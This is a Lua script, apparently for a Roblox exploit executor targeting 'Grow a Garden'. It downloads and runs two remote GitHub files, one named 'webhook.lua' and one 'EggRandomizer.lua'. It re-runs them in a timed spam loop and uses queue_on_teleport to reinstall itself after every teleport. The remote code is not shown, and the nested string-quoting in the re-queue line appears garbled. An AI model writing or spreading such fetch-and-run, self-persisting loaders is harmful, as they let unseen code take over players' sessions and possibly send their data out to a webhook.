-- Function to run both scripts with error handling
local function RunScripts()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeoHub/GrowAGarden/refs/heads/main/webhook.lua"))()
    end)
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeoHub/GrowAGarden/refs/heads/main/Load/EggRandomizer.lua"))()
    end)
end

-- Run immediately
RunScripts()

-- Create the teleport script with minimal syntax
local teleportScript = [==[
    -- Function to run both scripts
    local function RunBoth()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeoHub/GrowAGarden/refs/heads/main/webhook.lua"))()
        end)
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeoHub/GrowAGarden/refs/heads/main/Load/EggRandomizer.lua"))()
        end)
    end
    
    -- First run immediately
    RunBoth()
    
    -- Spam loop
    local startTime = tick()
    while tick() - startTime < 300 do  -- Run for 5 minutes
        RunBoth()
        wait(math.random(2, 5))  -- Random delay 2-5 seconds
    end
    
    -- Re-queue for next teleport
    queue_on_teleport([====[loadstring([=====[ ]=====] .. [===[ ]==] .. [====[ ]====] .. "loadstring('" .. teleportScript:gsub("'", "\\'") .. "')()" .. [====[ ]====] .. [===[ ]==] .. [====[ ]====])]==]
]==]

-- Queue the teleport script
queue_on_teleport("loadstring([==[" .. teleportScript .. "]==])()")
